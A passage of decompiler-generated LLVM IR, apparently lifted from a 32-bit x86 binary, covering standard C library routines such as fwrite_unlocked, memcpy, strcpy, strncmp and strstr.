dec_label_pc_805cce1:                             ; preds = %entry, %dec_label_pc_805ccdf
  %v0_805cce1 = phi i32 [ -1, %entry ], [ %v6_805ccd0, %dec_label_pc_805ccdf ]
  %v2_805cce4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805cce4, i32* @ebx, align 4
  store i32 %v0_805ccb4, i32* @esi, align 4
  ret i32 %v0_805cce1

; uselistorder directives
  uselistorder i32 %v6_805ccd0, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805cce1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805cce8 = load i32, i32* @edi, align 4
  %v0_805cce9 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_805ccef = trunc i64 %arg2 to i32
  store i32 %v4_805ccef, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_805ccf7 = inttoptr i32 %arg4 to i16*
  %v2_805ccf7 = load i16, i16* %v1_805ccf7, align 2
  %v1_805ccfa = and i16 %v2_805ccf7, 192
  %v6_805ccff = icmp eq i16 %v1_805ccfa, 192
  br i1 %v6_805ccff, label %dec_label_pc_805cd1a, label %dec_label_pc_805cd06

dec_label_pc_805cd06:                             ; preds = %entry
  %v0_805cd06 = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_805cd0e = call i32 @__stdio_trans2w_o(i16* %v1_805ccf7, i32 128, i32 %v0_805cd06, i32 %v0_805cd06)
  %v1_805cd16 = icmp eq i32 %v6_805cd0e, 0
  %v1_805cd18 = icmp eq i1 %v1_805cd16, false
  br i1 %v1_805cd18, label %dec_label_pc_805cd56, label %dec_label_pc_805cd1a

dec_label_pc_805cd1a:                             ; preds = %dec_label_pc_805cd06, %entry
  %v2_805cd1a = icmp eq i32 %v4_805ccef, 0
  br i1 %v2_805cd1a, label %dec_label_pc_805cd56, label %dec_label_pc_805cd1e

dec_label_pc_805cd1e:                             ; preds = %dec_label_pc_805cd1a
  %v1_805cd1e = icmp eq i32 %arg3, 0
  br i1 %v1_805cd1e, label %dec_label_pc_805cd56, label %dec_label_pc_805cd22

dec_label_pc_805cd22:                             ; preds = %dec_label_pc_805cd1e
  %v9_805cd27 = udiv i64 4294967295, %arg2
  %v10_805cd27 = trunc i64 %v9_805cd27 to i32
  %v6_805cd2b = icmp ult i32 %v10_805cd27, %arg3
  br i1 %v6_805cd2b, label %dec_label_pc_805cd47, label %dec_label_pc_805cd2d

dec_label_pc_805cd2d:                             ; preds = %dec_label_pc_805cd22
  %sext = mul i64 %arg2, 4294967296
  %v2_805cd30 = sdiv i64 %sext, 4294967296
  %v3_805cd30 = sext i32 %arg3 to i64
  %v4_805cd30 = mul nsw i64 %v3_805cd30, %v2_805cd30
  %v5_805cd30 = trunc i64 %v4_805cd30 to i32
  %v0_805cd33 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_805cd39 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_805cd30, i32 %v0_805cd33, i32 %v10_805cd27)
  %v6_805cd39 = sext i32 %v5_805cd39 to i64
  %v10_805cd40 = udiv i64 %v6_805cd39, %arg2
  %v11_805cd40 = trunc i64 %v10_805cd40 to i32
  br label %dec_label_pc_805cd58

dec_label_pc_805cd47:                             ; preds = %dec_label_pc_805cd22
  %v0_805cd47 = load i32, i32* @ebx, align 4
  %v1_805cd47 = inttoptr i32 %v0_805cd47 to i16*
  %v2_805cd47 = load i16, i16* %v1_805cd47, align 2
  %v3_805cd47 = or i16 %v2_805cd47, 8
  store i16 %v3_805cd47, i16* %v1_805cd47, align 2
  %v0_805cd4b = load i32, i32* %stack_var_-28, align 4
  %v1_805cd4b = call i32 @__errno_location(i32 %v0_805cd4b)
  %v1_805cd50 = inttoptr i32 %v1_805cd4b to i32*
  store i32 22, i32* %v1_805cd50, align 4
  br label %dec_label_pc_805cd56

dec_label_pc_805cd56:                             ; preds = %dec_label_pc_805cd1e, %dec_label_pc_805cd1a, %dec_label_pc_805cd06, %dec_label_pc_805cd47
  br label %dec_label_pc_805cd58

dec_label_pc_805cd58:                             ; preds = %dec_label_pc_805cd2d, %dec_label_pc_805cd56
  %v0_805cd5b = phi i32 [ %v11_805cd40, %dec_label_pc_805cd2d ], [ 0, %dec_label_pc_805cd56 ]
  store i32 %v0_805cce9, i32* @esi, align 4
  store i32 %v0_805cce8, i32* @edi, align 4
  ret i32 %v0_805cd5b

; uselistorder directives
  uselistorder i32 %v0_805cd06, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 (i16*, i32, i32, i32)* @__stdio_trans2w_o, { 1, 0, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805cd58, { 1, 0 }
  uselistorder label %dec_label_pc_805cd56, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805cd5d = load i32, i32* @esi, align 4
  store i32 %v0_805cd5d, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_805cd5e = sdiv i32 %sext, 16777216
  store i32 %v4_805cd5e, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805cd68 = ptrtoint i16* %arg1 to i32
  store i32 %v4_805cd68, i32* %edi.global-to-local, align 4
  %v2_805cd6c = udiv i32 %v4_805cd5e, 4
  %v3_805cd6f = inttoptr i32 %arg2 to i8*
  %v4_805cd6f = bitcast i16* %arg1 to i8*
  %v5_805cd6f = call i8* @_memcpy(i8* %v4_805cd6f, i8* %v3_805cd6f, i32 %v2_805cd6c)
  %v6_805cd6f = ptrtoint i8* %v5_805cd6f to i32
  store i32 %v6_805cd6f, i32* @ecx, align 4
  %v0_805cd71 = load i32, i32* %eax.global-to-local, align 4
  %v2_805cd71 = and i32 %v0_805cd71, 2
  %v3_805cd71 = icmp eq i32 %v2_805cd71, 0
  br i1 %v3_805cd71, label %dec_label_pc_805cd77, label %dec_label_pc_805cd75

dec_label_pc_805cd75:                             ; preds = %entry
  %v0_805cd75 = load i32, i32* %esi.global-to-local, align 4
  %v1_805cd75 = inttoptr i32 %v0_805cd75 to i16*
  %v2_805cd75 = load i16, i16* %v1_805cd75, align 2
  %v3_805cd75 = load i32, i32* %edi.global-to-local, align 4
  %v4_805cd75 = inttoptr i32 %v3_805cd75 to i16*
  store i16 %v2_805cd75, i16* %v4_805cd75, align 2
  %v5_805cd75 = load i32, i32* %edi.global-to-local, align 4
  %v6_805cd75 = load i32, i32* %esi.global-to-local, align 4
  %v7_805cd75 = load i1, i1* @df, align 1
  %v8_805cd75 = select i1 %v7_805cd75, i32 -2, i32 2
  %v9_805cd75 = add i32 %v8_805cd75, %v5_805cd75
  %v10_805cd75 = add i32 %v8_805cd75, %v6_805cd75
  store i32 %v9_805cd75, i32* %edi.global-to-local, align 4
  store i32 %v10_805cd75, i32* %esi.global-to-local, align 4
  %v0_805cd77.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805cd77

dec_label_pc_805cd77:                             ; preds = %entry, %dec_label_pc_805cd75
  %v0_805cd77 = phi i32 [ %v0_805cd71, %entry ], [ %v0_805cd77.pre, %dec_label_pc_805cd75 ]
  %v2_805cd77 = urem i32 %v0_805cd77, 2
  %v3_805cd77 = icmp eq i32 %v2_805cd77, 0
  br i1 %v3_805cd77, label %dec_label_pc_805cd7c, label %dec_label_pc_805cd7b

dec_label_pc_805cd7b:                             ; preds = %dec_label_pc_805cd77
  %v0_805cd7b = load i32, i32* %esi.global-to-local, align 4
  %v1_805cd7b = inttoptr i32 %v0_805cd7b to i8*
  %v2_805cd7b = load i8, i8* %v1_805cd7b, align 1
  %v3_805cd7b = load i32, i32* %edi.global-to-local, align 4
  %v4_805cd7b = inttoptr i32 %v3_805cd7b to i8*
  store i8 %v2_805cd7b, i8* %v4_805cd7b, align 1
  %v5_805cd7b = load i32, i32* %edi.global-to-local, align 4
  %v6_805cd7b = load i32, i32* %esi.global-to-local, align 4
  %v7_805cd7b = load i1, i1* @df, align 1
  %v8_805cd7b = select i1 %v7_805cd7b, i32 -1, i32 1
  %v9_805cd7b = add i32 %v8_805cd7b, %v5_805cd7b
  %v10_805cd7b = add i32 %v8_805cd7b, %v6_805cd7b
  store i32 %v9_805cd7b, i32* %edi.global-to-local, align 4
  store i32 %v10_805cd7b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805cd7c

dec_label_pc_805cd7c:                             ; preds = %dec_label_pc_805cd77, %dec_label_pc_805cd7b
  store i32 %v4_805cd68, i32* %eax.global-to-local, align 4
  %v2_805cd80 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805cd80, i32* @esi, align 4
  ret i32 %v4_805cd68

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_805cd7c, { 1, 0 }
  uselistorder label %dec_label_pc_805cd77, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805cd84 = load i32, i32* @edi, align 4
  %v4_805cd8d = ptrtoint i8* %arg1 to i32
  %v5_805cd91 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_805cd91 = ptrtoint i8* %v5_805cd91 to i32
  store i32 %v6_805cd91, i32* @ecx, align 4
  store i32 %v0_805cd84, i32* @edi, align 4
  ret i32 %v4_805cd8d

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805cd9d = ptrtoint i8* %arg1 to i32
  %v2_805cda5 = mul i32 %arg2, 256
  %v3_805cda5 = and i32 %v2_805cda5, 65280
  %v4_805cda5 = and i32 %arg2, -65281
  %v5_805cda5 = or i32 %v3_805cda5, %v4_805cda5
  %v8_805cda7.pre = load i1, i1* @df, align 1
  %v9_805cda7 = select i1 %v8_805cda7.pre, i32 -1, i32 1
  br label %dec_label_pc_805cda7

dec_label_pc_805cda7:                             ; preds = %dec_label_pc_805cdac, %entry
  %v4_805cda7 = phi i32 [ %v6_805cda7, %dec_label_pc_805cdac ], [ %v5_805cda5, %entry ]
  %v7_805cda7 = phi i32 [ %v10_805cda7, %dec_label_pc_805cdac ], [ %v4_805cd9d, %entry ]
  %v1_805cda7 = inttoptr i32 %v7_805cda7 to i8*
  %v2_805cda7 = load i8, i8* %v1_805cda7, align 1
  %v10_805cda7 = add i32 %v7_805cda7, %v9_805cda7
  %v3_805cda8 = udiv i32 %v4_805cda7, 256
  %v4_805cda8 = trunc i32 %v3_805cda8 to i8
  %v16_805cda8 = icmp eq i8 %v2_805cda7, %v4_805cda8
  br i1 %v16_805cda8, label %dec_label_pc_805cdb5, label %dec_label_pc_805cdac

dec_label_pc_805cdac:                             ; preds = %dec_label_pc_805cda7
  %v3_805cda7 = zext i8 %v2_805cda7 to i32
  %v5_805cda7 = and i32 %v4_805cda7, -256
  %v6_805cda7 = or i32 %v3_805cda7, %v5_805cda7
  %v4_805cdac = icmp eq i8 %v2_805cda7, 0
  %v1_805cdae = icmp eq i1 %v4_805cdac, false
  br i1 %v1_805cdae, label %dec_label_pc_805cda7, label %dec_label_pc_805cdb0

dec_label_pc_805cdb0:                             ; preds = %dec_label_pc_805cdac
  br label %dec_label_pc_805cdb5

dec_label_pc_805cdb5:                             ; preds = %dec_label_pc_805cda7, %dec_label_pc_805cdb0
  %v0_805cdb5 = phi i32 [ 1, %dec_label_pc_805cdb0 ], [ %v10_805cda7, %dec_label_pc_805cda7 ]
  %v1_805cdb7 = add i32 %v0_805cdb5, -1
  ret i32 %v1_805cdb7

; uselistorder directives
  uselistorder i8 %v2_805cda7, { 1, 2, 0 }
  uselistorder i32 %v4_805cda7, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805cdb5, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805cdbd = load i32, i32* @esi, align 4
  store i32 %v0_805cdbd, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805cdc5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805cdc5, i32* %edi.global-to-local, align 4
  %v4_805cdc9.pre = load i32, i32* @eax, align 4
  %v8_805cdc9.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_805cdc9

dec_label_pc_805cdc9:                             ; preds = %dec_label_pc_805cdc9.dec_label_pc_805cdc9_crit_edge, %entry
  %v2_805cdca = phi i32 [ %v7_805cdca, %dec_label_pc_805cdc9.dec_label_pc_805cdc9_crit_edge ], [ %v4_805cdc5, %entry ]
  %v8_805cdc9 = phi i1 [ %v5_805cdca, %dec_label_pc_805cdc9.dec_label_pc_805cdc9_crit_edge ], [ %v8_805cdc9.pre, %entry ]
  %v4_805cdc9 = phi i32 [ %v0_805cdcb, %dec_label_pc_805cdc9.dec_label_pc_805cdc9_crit_edge ], [ %v4_805cdc9.pre, %entry ]
  %v7_805cdc9 = phi i32 [ %v0_805cdc9.pre, %dec_label_pc_805cdc9.dec_label_pc_805cdc9_crit_edge ], [ %arg2, %entry ]
  %v1_805cdc9 = inttoptr i32 %v7_805cdc9 to i8*
  %v2_805cdc9 = load i8, i8* %v1_805cdc9, align 1
  %v3_805cdc9 = zext i8 %v2_805cdc9 to i32
  %v5_805cdc9 = and i32 %v4_805cdc9, -256
  %v6_805cdc9 = or i32 %v3_805cdc9, %v5_805cdc9
  store i32 %v6_805cdc9, i32* %eax.global-to-local, align 4
  %v9_805cdc9 = select i1 %v8_805cdc9, i32 -1, i32 1
  %v10_805cdc9 = add i32 %v7_805cdc9, %v9_805cdc9
  store i32 %v10_805cdc9, i32* %esi.global-to-local, align 4
  %v3_805cdca = inttoptr i32 %v2_805cdca to i8*
  store i8 %v2_805cdc9, i8* %v3_805cdca, align 1
  %v4_805cdca = load i32, i32* %edi.global-to-local, align 4
  %v5_805cdca = load i1, i1* @df, align 1
  %v6_805cdca = select i1 %v5_805cdca, i32 -1, i32 1
  %v7_805cdca = add i32 %v6_805cdca, %v4_805cdca
  store i32 %v7_805cdca, i32* %edi.global-to-local, align 4
  %v0_805cdcb = load i32, i32* %eax.global-to-local, align 4
  %v3_805cdcb = trunc i32 %v0_805cdcb to i8
  %v4_805cdcb = icmp eq i8 %v3_805cdcb, 0
  %v1_805cdcd = icmp eq i1 %v4_805cdcb, false
  br i1 %v1_805cdcd, label %dec_label_pc_805cdc9.dec_label_pc_805cdc9_crit_edge, label %dec_label_pc_805cdcf

dec_label_pc_805cdc9.dec_label_pc_805cdc9_crit_edge: ; preds = %dec_label_pc_805cdc9
  %v0_805cdc9.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805cdc9

dec_label_pc_805cdcf:                             ; preds = %dec_label_pc_805cdc9
  store i32 %v4_805cdc5, i32* %eax.global-to-local, align 4
  %v2_805cdd3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805cdd3, i32* @edx, align 4
  %v2_805cdd4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805cdd4, i32* @esi, align 4
  ret i32 %v4_805cdc5

; uselistorder directives
  uselistorder i32 %v0_805cdcb, { 1, 0 }
  uselistorder i32 %v7_805cdca, { 1, 0 }
  uselistorder i1 %v5_805cdca, { 1, 0 }
  uselistorder i32 %v4_805cdc5, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805cdee = ptrtoint i8* %arg1 to i32
  %v1_805cdfa = add i32 %arg3, 1
  br label %dec_label_pc_805cdfb

dec_label_pc_805cdfb:                             ; preds = %dec_label_pc_805ce02, %entry
  %v20_805cdff = phi i32 [ %v23_805cdff, %dec_label_pc_805ce02 ], [ %arg2, %entry ]
  %v7_805cdfe = phi i32 [ %v10_805cdfe, %dec_label_pc_805ce02 ], [ %v4_805cdee, %entry ]
  %v0_805cdfb = phi i32 [ %v1_805cdfb, %dec_label_pc_805ce02 ], [ %v1_805cdfa, %entry ]
  %v1_805cdfb = add i32 %v0_805cdfb, -1
  %v8_805cdfb = icmp eq i32 %v1_805cdfb, 0
  store i32 %v1_805cdfb, i32* @ecx, align 4
  br i1 %v8_805cdfb, label %dec_label_pc_805ce0e, label %dec_label_pc_805cdfe

dec_label_pc_805cdfe:                             ; preds = %dec_label_pc_805cdfb
  %v1_805cdfe = inttoptr i32 %v7_805cdfe to i8*
  %v2_805cdfe = load i8, i8* %v1_805cdfe, align 1
  %v3_805cdfe = zext i8 %v2_805cdfe to i32
  %v4_805cdfe = load i32, i32* @eax, align 4
  %v5_805cdfe = and i32 %v4_805cdfe, -256
  %v6_805cdfe = or i32 %v5_805cdfe, %v3_805cdfe
  store i32 %v6_805cdfe, i32* @eax, align 4
  %v8_805cdfe = load i1, i1* @df, align 1
  %v9_805cdfe = select i1 %v8_805cdfe, i32 -1, i32 1
  %v3_805cdff = inttoptr i32 %v20_805cdff to i8*
  %v4_805cdff = load i8, i8* %v3_805cdff, align 1
  %v15_805cdff = icmp eq i8 %v2_805cdfe, %v4_805cdff
  %v1_805ce00 = icmp eq i1 %v15_805cdff, false
  br i1 %v1_805ce00, label %dec_label_pc_805ce0a, label %dec_label_pc_805ce02

dec_label_pc_805ce02:                             ; preds = %dec_label_pc_805cdfe
  %v23_805cdff = add i32 %v9_805cdfe, %v20_805cdff
  %v10_805cdfe = add i32 %v9_805cdfe, %v7_805cdfe
  %v4_805ce02 = icmp eq i8 %v2_805cdfe, 0
  %v1_805ce04 = icmp eq i1 %v4_805ce02, false
  br i1 %v1_805ce04, label %dec_label_pc_805cdfb, label %dec_label_pc_805ce0e

dec_label_pc_805ce0a:                             ; preds = %dec_label_pc_805cdfe
  br label %dec_label_pc_805ce0e

dec_label_pc_805ce0e:                             ; preds = %dec_label_pc_805cdfb, %dec_label_pc_805ce02, %dec_label_pc_805ce0a
  %storemerge = phi i32 [ 1, %dec_label_pc_805ce0a ], [ 0, %dec_label_pc_805ce02 ], [ 0, %dec_label_pc_805cdfb ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v9_805cdfe, { 1, 0 }
  uselistorder i8 %v2_805cdfe, { 1, 0, 2 }
  uselistorder i32 %v1_805cdfb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805ce0e, { 2, 1, 0 }
}

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805ce15 = load i32, i32* @esi, align 4
  store i32 %v0_805ce15, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805ce21 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805ce21, i32* %edi.global-to-local, align 4
  %v1_805ce25 = add i32 %arg3, 1
  br label %dec_label_pc_805ce26

dec_label_pc_805ce26:                             ; preds = %dec_label_pc_805ce29, %entry
  %v3_805ce2a = phi i32 [ %v4_805ce21, %entry ], [ %v8_805ce2a, %dec_label_pc_805ce29 ]
  %v0_805ce26 = phi i32 [ %v1_805ce25, %entry ], [ %v0_805ce26.pre, %dec_label_pc_805ce29 ]
  %v1_805ce26 = add i32 %v0_805ce26, -1
  %v8_805ce26 = icmp eq i32 %v1_805ce26, 0
  store i32 %v1_805ce26, i32* @ecx, align 4
  br i1 %v8_805ce26, label %.loopexit, label %dec_label_pc_805ce29

dec_label_pc_805ce29:                             ; preds = %dec_label_pc_805ce26
  %v0_805ce29 = load i32, i32* %esi.global-to-local, align 4
  %v1_805ce29 = inttoptr i32 %v0_805ce29 to i8*
  %v2_805ce29 = load i8, i8* %v1_805ce29, align 1
  %v10_805ce29 = load i1, i1* @df, align 1
  %v11_805ce29 = select i1 %v10_805ce29, i32 -1, i32 1
  %v12_805ce29 = add i32 %v11_805ce29, %v0_805ce29
  store i32 %v12_805ce29, i32* %esi.global-to-local, align 4
  %v4_805ce2a = inttoptr i32 %v3_805ce2a to i8*
  store i8 %v2_805ce29, i8* %v4_805ce2a, align 1
  %v5_805ce2a = load i32, i32* %edi.global-to-local, align 4
  %v6_805ce2a = load i1, i1* @df, align 1
  %v7_805ce2a = select i1 %v6_805ce2a, i32 -1, i32 1
  %v8_805ce2a = add i32 %v7_805ce2a, %v5_805ce2a
  store i32 %v8_805ce2a, i32* %edi.global-to-local, align 4
  %v6_805ce2b = icmp eq i8 %v2_805ce29, 0
  %v1_805ce2d = icmp eq i1 %v6_805ce2b, false
  %v0_805ce26.pre = load i32, i32* @ecx, align 4
  br i1 %v1_805ce2d, label %dec_label_pc_805ce26, label %dec_label_pc_805ce2f

dec_label_pc_805ce2f:                             ; preds = %dec_label_pc_805ce29
  %v1_805ce2f = add i32 %v0_805ce26.pre, -1
  %v2_805ce30 = sext i8 %v2_805ce29 to i32
  %v4_805ce30 = inttoptr i32 %v8_805ce2a to i8*
  %v5_805ce30 = call i8* @_memset(i8* %v4_805ce30, i32 %v2_805ce30, i32 %v1_805ce2f)
  %v6_805ce30 = ptrtoint i8* %v5_805ce30 to i32
  store i32 %v6_805ce30, i32* @ecx, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_805ce26, %dec_label_pc_805ce2f
  %v2_805ce36 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805ce36, i32* @edx, align 4
  %v2_805ce37 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805ce37, i32* @esi, align 4
  ret i32 %v4_805ce21

; uselistorder directives
  uselistorder i32 %v8_805ce2a, { 0, 2, 1 }
  uselistorder i8 %v2_805ce29, { 0, 2, 1 }
  uselistorder i32 %v1_805ce26, { 1, 0 }
  uselistorder i32 %v4_805ce21, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_3()
  %v4_805ce3c = ptrtoint i8* %tmp4 to i32
  %v8_805ce4f8 = icmp eq i32 %tmp, 0
  %v1_805ce509 = icmp eq i1 %v8_805ce4f8, false
  br i1 %v1_805ce509, label %dec_label_pc_805ce49, label %dec_label_pc_805ce52

dec_label_pc_805ce49:                             ; preds = %entry, %dec_label_pc_805ce4e
  %v1_805ce4f11 = phi i32 [ %v1_805ce4f, %dec_label_pc_805ce4e ], [ %tmp, %entry ]
  %v0_805ce5210 = phi i32 [ %v1_805ce4e, %dec_label_pc_805ce4e ], [ %v4_805ce3c, %entry ]
  %v1_805ce49 = inttoptr i32 %v0_805ce5210 to i8*
  %v2_805ce49 = load i8, i8* %v1_805ce49, align 1
  %v3_805ce49 = icmp eq i8 %v2_805ce49, 0
  br i1 %v3_805ce49, label %dec_label_pc_805ce52, label %dec_label_pc_805ce4e

dec_label_pc_805ce4e:                             ; preds = %dec_label_pc_805ce49
  %v1_805ce4e = add i32 %v0_805ce5210, 1
  %v1_805ce4f = add i32 %v1_805ce4f11, -1
  %v8_805ce4f = icmp eq i32 %v1_805ce4f, 0
  %v1_805ce50 = icmp eq i1 %v8_805ce4f, false
  br i1 %v1_805ce50, label %dec_label_pc_805ce49, label %dec_label_pc_805ce52

dec_label_pc_805ce52:                             ; preds = %dec_label_pc_805ce4e, %dec_label_pc_805ce49, %entry
  %v0_805ce52.lcssa = phi i32 [ %v4_805ce3c, %entry ], [ %v0_805ce5210, %dec_label_pc_805ce49 ], [ %v1_805ce4e, %dec_label_pc_805ce4e ]
  %v2_805ce52 = sub i32 %v0_805ce52.lcssa, %v4_805ce3c
  ret i32 %v2_805ce52

; uselistorder directives
  uselistorder i32 %v1_805ce4f, { 1, 0 }
  uselistorder i32 %v0_805ce5210, { 0, 2, 1 }
  uselistorder i32 %v4_805ce3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805ce49, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %v0_805ce5b = load i32, i32* @ebx, align 4
  %v4_805ce5f = ptrtoint i8* %arg2 to i32
  %v2_805ce67 = load i8, i8* %arg2, align 1
  %v1_805ce6a = icmp eq i8 %v2_805ce67, 0
  br i1 %v1_805ce6a, label %dec_label_pc_805cf17, label %dec_label_pc_805ce72

dec_label_pc_805ce72:                             ; preds = %entry
  %v1_805ce72 = add i32 %arg1, -1
  br label %dec_label_pc_805ce73

dec_label_pc_805ce73:                             ; preds = %dec_label_pc_805ce7f, %dec_label_pc_805ce72
  %v0_805ce73 = phi i32 [ %v1_805ce73, %dec_label_pc_805ce7f ], [ %v1_805ce72, %dec_label_pc_805ce72 ]
  %v1_805ce73 = add i32 %v0_805ce73, 1
  %v1_805ce74 = inttoptr i32 %v1_805ce73 to i8*
  %v2_805ce74 = load i8, i8* %v1_805ce74, align 1
  %v1_805ce77 = icmp eq i8 %v2_805ce74, 0
  br i1 %v1_805ce77, label %dec_label_pc_805cf15, label %dec_label_pc_805ce7f

dec_label_pc_805ce7f:                             ; preds = %dec_label_pc_805ce73
  %v12_805ce7f = icmp eq i8 %v2_805ce74, %v2_805ce67
  %v1_805ce81 = icmp eq i1 %v12_805ce7f, false
  br i1 %v1_805ce81, label %dec_label_pc_805ce73, label %dec_label_pc_805ce83

dec_label_pc_805ce83:                             ; preds = %dec_label_pc_805ce7f
  %v1_805ce83 = add i32 %v4_805ce5f, 1
  %v2_805ce8a = inttoptr i32 %v1_805ce83 to i8*
  %v3_805ce8a = load i8, i8* %v2_805ce8a, align 1
  %v1_805ce91 = icmp eq i8 %v3_805ce8a, 0
  br i1 %v1_805ce91, label %dec_label_pc_805cf17, label %dec_label_pc_805ce95

dec_label_pc_805ce95:                             ; preds = %dec_label_pc_805ce83
  %v1_805ce95 = add i32 %v0_805ce73, 2
  %v1_805ced6 = add i32 %v4_805ce5f, 2
  %v2_805ced6 = inttoptr i32 %v1_805ced6 to i8*
  br label %dec_label_pc_805cec8

dec_label_pc_805cea0:                             ; preds = %dec_label_pc_805cf0d
  %v2_805cea0 = inttoptr i32 %v0_805cedb to i8*
  %v3_805cea0 = load i8, i8* %v2_805cea0, align 1
  br label %dec_label_pc_805cebd.preheader

dec_label_pc_805cebd.preheader:                   ; preds = %dec_label_pc_805cea0, %dec_label_pc_805cec8
  %v0_805cea9.ph.in = phi i8 [ %v0_805cebd27.in, %dec_label_pc_805cec8 ], [ %v3_805cea0, %dec_label_pc_805cea0 ]
  %v12_805cebd58 = icmp eq i8 %v0_805cea9.ph.in, %v2_805ce67
  %v1_805cebf59 = icmp eq i1 %v12_805cebd58, false
  br i1 %v1_805cebf59, label %dec_label_pc_805cea9, label %dec_label_pc_805cec1

dec_label_pc_805cea9:                             ; preds = %dec_label_pc_805cebd.preheader, %dec_label_pc_805ceb9
  %v0_805cea961.in = phi i8 [ %v2_805ceba, %dec_label_pc_805ceb9 ], [ %v0_805cea9.ph.in, %dec_label_pc_805cebd.preheader ]
  %v0_805cead60 = phi i32 [ %v1_805ceb9, %dec_label_pc_805ceb9 ], [ %v0_805cedb, %dec_label_pc_805cebd.preheader ]
  %v1_805cea9 = icmp eq i8 %v0_805cea961.in, 0
  br i1 %v1_805cea9, label %dec_label_pc_805cf15, label %dec_label_pc_805cead

dec_label_pc_805cead:                             ; preds = %dec_label_pc_805cea9
  %v1_805cead = add i32 %v0_805cead60, 1
  %v1_805ceae = inttoptr i32 %v1_805cead to i8*
  %v2_805ceae = load i8, i8* %v1_805ceae, align 1
  %v12_805ceb1 = icmp eq i8 %v2_805ceae, %v2_805ce67
  br i1 %v12_805ceb1, label %dec_label_pc_805cec1, label %dec_label_pc_805ceb5

dec_label_pc_805ceb5:                             ; preds = %dec_label_pc_805cead
  %v1_805ceb5 = icmp eq i8 %v2_805ceae, 0
  br i1 %v1_805ceb5, label %dec_label_pc_805cf15, label %dec_label_pc_805ceb9

dec_label_pc_805ceb9:                             ; preds = %dec_label_pc_805ceb5
  %v1_805ceb9 = add i32 %v0_805cead60, 2
  %v1_805ceba = inttoptr i32 %v1_805ceb9 to i8*
  %v2_805ceba = load i8, i8* %v1_805ceba, align 1
  %v12_805cebd = icmp eq i8 %v2_805ceba, %v2_805ce67
  %v1_805cebf = icmp eq i1 %v12_805cebd, false
  br i1 %v1_805cebf, label %dec_label_pc_805cea9, label %dec_label_pc_805cec1

dec_label_pc_805cec1:                             ; preds = %dec_label_pc_805ceb9, %dec_label_pc_805cead, %dec_label_pc_805cebd.preheader
